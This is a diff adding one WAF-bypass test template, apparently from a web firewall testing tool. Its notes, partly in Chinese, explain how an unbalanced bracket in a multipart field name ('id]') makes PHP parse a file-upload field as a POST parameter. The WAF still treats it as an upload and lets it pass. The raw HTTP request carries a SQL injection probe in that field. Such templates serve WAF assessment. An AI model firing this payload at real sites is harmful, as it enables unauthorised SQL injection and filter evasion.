@@ -1,0 +1,19 @@
+# @name: PHP skip_upload参数名不配对中括号
+# @tags: post,multipart,php,skip-upload,bracket,id,bypass
+# @color: blue
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: php_skip_upload_unbalanced_bracket
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: PHP rfc1867.c 中参数名括号计数 c<0 即置 skip_upload=1。构造 name="id]" 使计数为负，即使带 filename= 也被 PHP 当作 POST 参数，WAF 仍认为是文件上传而放行。仅适用于按参数前缀取值或 HPP 场景。参考 do9gy Part3 第1条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id]"; filename="1.png"
+
+1' and 'a'='a
+--a--
